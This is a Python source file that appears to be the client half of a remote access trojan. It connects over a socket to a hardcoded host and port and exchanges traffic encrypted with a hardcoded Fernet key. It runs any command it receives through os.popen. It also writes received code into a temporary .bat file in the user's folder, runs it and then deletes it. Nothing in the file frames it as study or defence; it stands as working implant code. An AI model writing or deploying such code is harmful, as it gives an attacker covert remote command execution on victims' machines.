#import
import sys
import os
import zlib
import socket
from cryptography.fernet import Fernet

class Connection:


    def __init__(self):
        self.sock = None
        self.stat = False
        self.ip = "192.168.1.101"
        self.port = 10000
        self.criptokey = Fernet(b'PwgEU6_d09vEPRrFpLgtnUf_ixxUxThA94Ma31823iI=')





    def INIT_CONN(self):
        try:
            self.sock = socket.socket()
            self.sock.connect((self.ip, self.port))
            return True
        except:
            return False

    def CLOSE_CONN(self):
        try:
            self.sock.close()
            return True
        except:
            return False






    def Ip_Targhet(self):
        try:
            return self.ip
        except:
            return False

    def Port(self):
        try:
            return self.port
        except:
            return False

    def Stat_Conn(self):
        try:
            return self.stat
        except:
            return False





    def SEND(self, data):
        try:
            data = data.encode()
        except:
            pass
        try:
            crc32 = zlib.crc32(data).to_bytes(6, 'big')
            data = self.criptokey.encrypt(data)
            packet = data + b'@' + crc32
            self.sock.send(packet)
            return True
        except:
            return False

    def RECV(self):
        try:
            try:
                data = self.sock.recv(4080)
            except:
                sys.exit()

            data = data.split(b'@')
            crc32 = data[-1]
            data.pop(-1)
            payload = b''
            for index in data:
                payload = payload + index + b'@'
            payload = payload.decode()
            payload = list(payload)
            payload.pop(-1)
            payload = "".join(payload)
            payload = payload.encode()
            payload = self.criptokey.decrypt(payload)
            if zlib.crc32(payload).to_bytes(6, 'big') != crc32:
                return False
            else:
                return payload
        except:
            return False
class Comand():

    def EX_COMMAND(self, command):
        try:
            output = os.popen(command).read()
            return output
        except:
            return False

    def EX_SCRIPT(self, code):
        try:
            output = os.popen("whoami").read()
            user = output.split("/")[-1]
            script = open("C:\\Users\\" + user + "\\code.bat", "w+")
            script.write(code)
            script.close()
            output_script = os.popen("C:\\Users\\" + user + "\\code.bat").read()
            os.remove("C:\\Users\\" + user + "\\code.bat")
            return output_script
        except:
            return False